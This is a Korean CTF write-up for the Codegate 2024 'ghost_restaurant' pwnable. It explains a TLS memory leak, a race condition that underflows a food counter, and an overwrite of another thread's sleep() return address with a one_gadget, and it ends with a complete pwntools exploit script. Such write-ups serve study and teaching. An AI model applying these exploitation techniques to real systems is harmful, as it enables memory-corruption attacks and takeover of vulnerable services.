+++
title = "Codegate CTF 2024 Quals - ghost_restaurant (without shadow stack)"
date = "2024-08-28"
description = "Codegate CTF 2024 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "race condition", "tls"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/ghost_restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Structure
``` c
struct food {
    char name[0x40];
    long cook_time;
    long left_time;
}
```
이 외에도 사용되는 구조체가 몇개 있지만 문제 풀이에 중요한 구조체만 정리하였다.

### Concept
`oven`을 생성해서 선택하면 `cook_1928` 쓰레드가 생성되어 `food`를 `insert`하거나 `remove`할 수 있다.

`insert` 시 입력한 `cook_time`만큼의 시간이 지나면 `food`가 완성되며 이 때 시간을 감소시키고 시간이 다 지났는지 확인하는 과정은 `start_routine_16B1` 쓰레드를 통해 이루어진다.

## 0x01. Vulnerability
### Information leak
`cook_time`이 다 되어서든, `remove`를 해서든 `food`가 삭제될 때 다음과 같은 로직을 통해 메모리가 변경된다.
``` c
printf("Select food to remove in '%s':\n", oven->name);
__isoc99_scanf("%d", &tmp);
for ( i = tmp; i < food_count; ++i )
{
  food_next = food[i + 1];
  food_cur = food[i];
  memcpy(food_cur, food_next, 0x50);
}
```
이 때 `food[i + 1]`에 어떤 값이 있는지 확인하지 않고 무조건 `food[i]`로 복사를 해오기 때문에 `food[i + 1]`에 중요한 데이터가 있다면 leak이 가능하다.

### Race condition
`food`의 남은 시간을 체크하는 `start_routine_16B1`의 코드를 보면,
``` c
void __fastcall __noreturn start_routine_16B1(struct argument *a1)
{
  ...
  while ( 1 )
  {
    if ( *(__int64 *)arg->count > 0 )
    {
      for ( i = 0; i < *(_QWORD *)arg->count; ++i )
      {
        if ( arg->food[i].left_time > 0 )
        {
          food_tmp = &arg->food[i];
          if ( !--food_tmp->left_time )
          {
            printf("'%s' is ready!\n", arg->food[i].name);
            ...
            for ( j = i; j < *(_QWORD *)arg->count; ++j )
            {
              food_next = &arg->food[j + 1];
              food_cur = &arg->food[j];
              memcpy(food_cur, food_next, 0x50);
            }
            --*(_QWORD *)arg->count;
          }
        }
      }
    }
    sleep(1u);
  }
}
```
`left_time`이 `0`이 됐을 때 해당 `food` 구조체 이후의 구조체들을 한 칸씩 앞으로 땡겨주고 `food_count`를 감소시킨다.

이 외에 다른 방법으로도 `food`를 제거할 수 있는데 `cook_1928`의 코드를 보면,
``` c
void *__fastcall cook_1928(struct oven *a1)
{
  ...
  while ( 1 )
  {
    pthread_mutex_lock((pthread_mutex_t *)oven->mutex);
    while ( !LODWORD(oven->ready) )
      pthread_cond_wait((pthread_cond_t *)oven->cond, (pthread_mutex_t *)oven->mutex);
    ...
    __isoc99_scanf("%d", &choice);
    ...
    if ( choice == 2 )
    {
      printf("Select food to remove in '%s':\n", oven->name);
      ...
      __isoc99_scanf("%d", &tmp);
      if ( (int)tmp <= (__int64)__readfsqword(0xFFFFFE90) && (int)tmp > 0 )
      {
        LODWORD(tmp) = tmp - 1;
        for ( m = tmp; m < (__int64)__readfsqword(0xFFFFFE90); ++m )
        {
          food_cur = (struct food *)(__readfsqword(0) + 0x50LL * m - 0x160);
          food_next = (struct food *)(__readfsqword(0) + 0x50LL * (m + 1) - 0x160);
          memcpy(food_cur, food_next, 0x50);
        }
        __writefsqword(0xFFFFFE90, __readfsqword(0xFFFFFE90) - 1);
        goto LABEL_39;
      }
LABEL_19:
      puts("Invalid choice.");
      pthread_mutex_unlock((pthread_mutex_t *)oven->mutex);
    }
LABEL_39:
    pthread_mutex_unlock((pthread_mutex_t *)oven->mutex);
  }
  ...
}
```
현재 들어가있는 `food`의 목록을 출력해주고 `tmp`에 제거할 `food`의 인덱스를 받아서 삭제한 후 26번 라인의 `__writefsqword()`를 통해 `food_count` 값을 감소시킨다.

여기에서 발생하는 취약점은 `start_routine_16B1`에서 시간이 다 됐을 때 `food_count`를 감소시키는 코드가 critical section으로 관리되지 않는다.

따라서 `cook_1928`의 `remove` 로직과 동시에 실행될 수 있기 때문에 race condition이 발생한다.

|cook_1928|start_routine_16B1|
|:---|---:|
|`if ( tmp <= __readfsqword(0xFFFFFE90) && tmp > 0 )`||
||`food_next = &arg->food[j + 1];`|
|`food_cur = (__readfsqword(0) + 0x50LL * m - 0x160);`||
||`food_cur = &arg->food[j];`|
|`food_next = (__readfsqword(0) + 0x50LL * (m + 1) - 0x160);`||
||`memcpy(food_cur, food_next, 0x50);`|
|`memcpy(food_cur, food_next, 0x50);`||
||`--*(_QWORD *)arg->count;`|
|`__writefsqword(0xFFFFFE90, __readfsqword(0xFFFFFE90) - 1);`||

위와 같은 방식으로 race condition이 발생하게 된다면 `insert`를 한번 했더라도 값의 감소가 두번 이루어져 `food_count`에 underflow가 발생할 수 있다.

## 0x02. Exploit
### Information leak
`food[0]`을 기준으로 `food`의 사이즈인 0x50씩 메모리를 출력하다보면 다음 영역을 확인할 수 있다.
``` bash
gef➤
0x7ffff7da56a0: 0x0000000000000000      0x0000000000000000
0x7ffff7da56b0: 0x0000000000000000      0x0000000000000000
0x7ffff7da56c0: 0x00007ffff7da56c0      0x000055555555a960
0x7ffff7da56d0: 0x00007ffff7da56c0      0x0000000000000001
0x7ffff7da56e0: 0x0000000000000000      0x3ce1f8458248c000
```
`food[4]`에 해당하는 영역에 위와 같이 TLS, heap 영역에 대한 주소와 이 문제에서 필요하지는 않지만 canary 값이 저장되어있다.

`food`는 최대 4개까지 `insert`할 수 있으므로 `food[0]`~`food[3]`까지 생성했다가 `food[0]`을 `remove`를 하면 `food[4]`의 데이터를 `food[3]`에 복사한다.

이런 식으로 `food[0]`을 4번 `remove`하면 `food[4]` 영역의 데이터가 `food[0]`~`food[3]`에 복사가 된다.

참고로 `0x7ffff7da56c0`에 저장된 `0x7ffff7da56c0`가 TLS 주소로, `__readfsqword(0)`를 실행했을 때 반환되는 값이다.

이 값이 다른 값으로 바뀌게 되면 `__readfsqword(0)`의 결과가 바뀐 값으로 반환되어 주의해야 한다.
``` c
printf("Foods in '%s':\n", oven->name);
for ( i = 0; i < (__int64)__readfsqword(0xFFFFFE90); ++i )
  printf(
    "%d. %s (cooking for %lld seconds, %lld seconds left)\n",
    (unsigned int)(i + 1),
    (const char *)(80LL * i + __readfsqword(0) - 0x160),  // name; 0x00007ffff7d864e0
    *(_QWORD *)(__readfsqword(0) + 0x50LL * i - 0x120),   // cook_time
    *(_QWORD *)(__readfsqword(0) + 0x50LL * i - 0x118));  // left_time
```
`food.name`의 출력을 `%s`로 해주기 때문에 중간에 있는 `\x00`들을 채워주어야 하는데, `name`선택 시 고를 수 있는 hidden choice를 하면 호출되는 `read()`를 통해 해결할 수 있다.
``` c
if ( food_choice == 4 )     // hidden
{
  pthread_mutex_lock(&prompt_mutex_5100);
  printf("Enter food name for spacial food: ");
  read(0, (void *)(__readfsqword(0) - 0x160 + 0x50 * __readfsqword(0xFFFFFE90)), 0x40uLL);  // name; 0x00007ffff7d864e0
  pthread_mutex_unlock(&prompt_mutex_5100);
}
```
따라서 다음과 같이 payload를 작성했다.
``` python
    create_oven(s, b"1111")
    select_oven(s, b"1")

    for _ in range(4):
        insert_food(s, b"1", 12345)
    for _ in range(4):
        remove_food(s, b"1")
    insert_food(s, b"5", 12345, b"A" * 0x20)
    r = insert_food(s, b"5", 12345, b"B" * 0x28)
    tls = u64(r.split(b"A" * 0x20)[1].split(b" ")[0] + b"\x00\x00")
    libc = tls + 0x3940
    heap = u64(r.split(b"B" * 0x28)[2].split(b" ")[0] + b"\x00\x00") - 0x960
    remove_food(s, b"1")
    remove_food(s, b"1")
```
이 때 TLS의 위치가 libc의 바로 위 영역에 할당되므로 offset을 계산하면 libc base도 획득할 수 있다.

### Race condition
Race condition을 트리거하기 위한 sleep time을 구하기 위해 brute force를 수행하는 payload를 작성했다.
``` python
def brute_force_time(port):
    context.log_level = 'error'
    for i in range(10000):
        s = remote("0.0.0.0", port)
        s.recvuntil(b"option: ")
        create_oven(s, b"1111")
        select_oven(s, b"1")

        # information leak

        insert_food(s, b"1", 1)
        sleep_time = 0.95 + i / 10000
        sleep(sleep_time)
        remove_food(s, b"1")
        r = insert_food(s, b"1", 60)
        if len(r.split(b"\n")) > 60:
            print(f"success : {sleep_time}")
        s.close()
        print(f'\rProgress: {i} / 10000\r', end='')
```
실질적으로는 information leak을 수행한 후에 race condition을 트리거하므로 같은 상황을 만들어주기 위해 information leak을 위한 payload도 중간에 작성해야 정확한 time을 구할 수 있다.

트리거 성공 시 `food_count`가 -1이 되고 이 때 `insert`를 하면 `food[-1]`에 데이터를 쓸 수 있게된다.
```
food[-1]     :  0x00007ffff7da5510 -> name[0x40]
                0x00007ffff7da5520
                0x00007ffff7da5530
                0x00007ffff7da5540
food_count   :  0x00007ffff7da5550 -> cook_time[0x8], left_time[0x8]
food[0]      :  0x00007ffff7da5560 -> name[0x40]
                0x00007ffff7da5570
                0x00007ffff7da5580
                0x00007ffff7da5590
                0x00007ffff7da55a0 -> cook_time[0x8], left_time[0x8]
                0x00007ffff7da55b0
                ...
TLS          :  0x00007ffff7da56c0
                ...
LIBC         :  0x00007ffff7da9000
```
이 때 입력하는 `cook_time`이 `food_count` 위치에 쓰여지기 때문에 `cook_time`을 60으로 입력하면 `food_count`가 60인 것으로 인식되어 `food`를 60개 출력해준다.

따라서 트리거 성공 여부를 출력되는 `food`의 개수로 판단하게끔 payload를 작성했다.
``` bash
➜  python3 exploit.py -p 8798 -d 0 -b 1
success : 0.981
success : 0.9814
success : 0.9816
```
그 결과 적당한 sleep time을 구할 수 있었다. 다만 여러 번 실행하면 메모리 이슈 때문인지 time window가 조금씩 밀리는 모양이다.

### RIP control
Race condition을 트리거한 후 gdb에서 `info threads`를 통해 쓰레드 정보를 확인해보면 다음과 같다.
``` bash
gef➤  info threads
  Id   Target Id          Frame
  1    LWP 974101 "chall" 0x00007ffff7e41d61 in ?? () from ./lib/x86_64-linux-gnu/libc.so.6
* 2    LWP 974149 "chall" 0x0000555555555e51 in ?? ()
  3    LWP 974150 "chall" 0x00007ffff7e95adf in clock_nanosleep () from ./lib/x86_64-linux-gnu/libc.so.6
```
이 중 3번 쓰레드가 `start_routine_16B1`이 실행되는 쓰레드로, `thread 3` 명령을 통해 context를 switch해보면,
``` bash
[#0] 0x7ffff7e95adf → clock_nanosleep()
[#1] 0x7ffff7ea2a27 → nanosleep()
[#2] 0x7ffff7eb7c63 → sleep()
[#3] 0x555555555923 → jmp 0x5555555556d9
[#4] 0x7ffff7e45a94 → jmp 0x7ffff7e4586d
[#5] 0x7ffff7ed2a34 → clone()
─────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rsp
$1 = (void *) 0x7ffff75a3c20
gef➤  vmmap 0x7ffff75a3c20
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007ffff6da5000 0x00007ffff75a5000 0x0000000000000000 rw-
```
위와 같이 매 초마다 `left_time`을 감소시키고 `food`가 완성되었는지 확인하기 위해서 `clock_nanosleep()`을 실행하고 있다.

또한 앞서 leak한 TLS와는 다른 TLS 영역을 할당받아 stack으로 활용하고 있다.

Call stack을 보면 `sleep()` -> `nanosleep()` -> `clock_nanosleep()` 순으로 호출이 되었는데, 무언가 overwrite를 하기 위해서라면 호출 주기가 긴 `sleep()`을 타겟으로 디버깅을 하다보면,
``` bash
 → 0x7ffff7eb7c84 <sleep+100>      ret
──────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x7ffff7e41d61 in ?? (), reason: SINGLE STEP
[#1] Id 2, Name: "chall", stopped 0x7ffff7ec4a9a in read (), reason: SINGLE STEP
[#2] Id 3, Name: "chall", stopped 0x7ffff7eb7c84 in sleep (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7eb7c84 → sleep()
[#1] 0x555555555923 → jmp 0x5555555556d9
[#2] 0x7ffff7e45a94 → jmp 0x7ffff7e4586d
[#3] 0x7ffff7ed2a34 → clone()
─────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/gx $rsp
0x7ffff75a3ce8: 0x0000555555555923
```
이렇게 `sleep()`이 `ret`를 하는 순간이 오고 이 때 `rsp`는 `0x7ffff75a3ce8`를 가리키고 있다.

이 주소는 앞서 leak한 `0x7ffff7da56c0`와 다른 TLS 영역의 주소이긴 하지만, TLS 사이의 offset이 일정하게 할당이 되어 offset을 계산해주면 해당 영역에 접근할 수 있다.

원본 문제는 shadow stack이 적용되어있으나 여기에서는 shadow stack이 없는 환경이기 때문에 이 `return address`를 덮어서 RIP control이 가능하다.

Race condition 트리거를 성공하면 `food_count`가 -1이 되어 `food[-1].cook_time`의 위치가 `food_count`의 위치가 되는 것을 이용하면 다음과 같이 thread 3 `sleep()`의 `return address`에 값을 쓰는 것이 가능하다.
``` python
    insert_food(s, b"1", 1)
    sleep(0.9813)
    remove_food(s, b"1")
    
    food = 0x7ffff7da5560
    ret_sleep = 0x7ffff75a3ce0
    index = (food - ret_sleep) // 0x50 + 1
    print(insert_food(s, b"1", index * -1))

    one_gadget = 0x583dc
    payload = b"A" * 8
    payload += p64(libc + one_gadget)
    insert_food(s, b"5", 12345, payload)
```
마침 활용할 수 있는 one shot 가젯이 있어서 one shot 가젯의 주소로 덮어주었다.

## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc.so.6"
CONTAINER = "2206a2d4bc57"

code_base = 0x0000555555554000
bp = {
    'cook' : code_base + 0x1928,
    'dec_count_cook' : code_base + 0x21F9,
    'read_insert_cook' : code_base + 0x1E51,
    'remove_cook' : code_base + 0x1F9D,
    'go_back_cook' : code_base + 0x221A,
    'ret_print_oven' : code_base + 0x16B0,
}

gs = f'''
continue
b *{bp['dec_count_cook']}
b *{bp['read_insert_cook']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def create_oven(s, name):
    s.sendline(b"0")
    s.recvuntil(b"name: ")
    s.sendline(name)
    return s.recvuntil(b"option: ")

def select_oven(s, number):
    s.sendline(number)
    return s.recvuntil(b"option: ")

def insert_food(s, number, time, name=""):
    s.sendline(b"1")
    s.recvuntil(b"> ")
    s.sendline(number)
    s.recvuntil(b"(seconds): ")
    s.sendline(str(time).encode())
    if number == b"5":
        s.recvuntil(b"food: ")
        s.send(name)
    return s.recvuntil(b"option: ")

def remove_food(s, number):
    s.sendline(b"2")
    s.recvuntil(b"> ")
    s.sendline(number)
    return s.recvuntil(b"option: ")

def go_back(s):
    s.sendline(b"3")
    return s.recvuntil(b"option: ")

def brute_force_time(port):
    context.log_level = 'error'
    for i in range(10000):
        s = remote("0.0.0.0", port)
        s.recvuntil(b"option: ")
        create_oven(s, b"1111")
        select_oven(s, b"1")

        for _ in range(4):
            insert_food(s, b"1", 12345)
        for _ in range(4):
            remove_food(s, b"1")
        insert_food(s, b"5", 12345, b"A" * 0x20)
        r = insert_food(s, b"5", 12345, b"B" * 0x28)
        tls = u64(r.split(b"A" * 0x20)[1].split(b" ")[0] + b"\x00\x00")
        libc = tls + 0x3940
        heap = u64(r.split(b"B" * 0x28)[2].split(b" ")[0] + b"\x00\x00") - 0x960
        remove_food(s, b"1")
        remove_food(s, b"1")

        insert_food(s, b"1", 1)
        sleep_time = 0.98 + i / 10000
        sleep(sleep_time)
        remove_food(s, b"1")
        r = insert_food(s, b"1", 60)
        if len(r.split(b"\n")) > 60:
            print(f"success : {sleep_time}")
        s.close()
        print(f'\rProgress: {i} / 10000\r', end='')

def main(port, debug, brute_force):
    if(brute_force):
        brute_force_time(port)
    if(port):
        s = remote("0.0.0.0", port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recvuntil(b"option: ")
    create_oven(s, b"1111")
    select_oven(s, b"1")

    # information leak
    for _ in range(4):
        insert_food(s, b"1", 12345)
    for _ in range(4):
        remove_food(s, b"1")
    insert_food(s, b"5", 12345, b"A" * 0x20)
    r = insert_food(s, b"5", 12345, b"B" * 0x28)
    tls = u64(r.split(b"A" * 0x20)[1].split(b" ")[0] + b"\x00\x00")
    libc = tls + 0x3940
    heap = u64(r.split(b"B" * 0x28)[2].split(b" ")[0] + b"\x00\x00") - 0x960
    remove_food(s, b"1")
    remove_food(s, b"1")

    # trigger race condition
    insert_food(s, b"1", 1)
    sleep(0.9814)
    remove_food(s, b"1")
    
    # overwrite food_count
    food = 0x7ffff7da5560
    ret_sleep = 0x7ffff75a3ce0
    index = (food - ret_sleep) // 0x50 + 1
    print(insert_food(s, b"1", index * -1))
    
    # overwrite ret of sleep() in thread 3
    one_gadget = 0x583dc
    payload = b"A" * 8
    payload += p64(libc + one_gadget)
    insert_food(s, b"5", 12345, payload)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    parser.add_argument('-b', '--brute_force', type=int, default=0)
    args = parser.parse_args()
    main(args.port, args.debug, args.brute_force)
```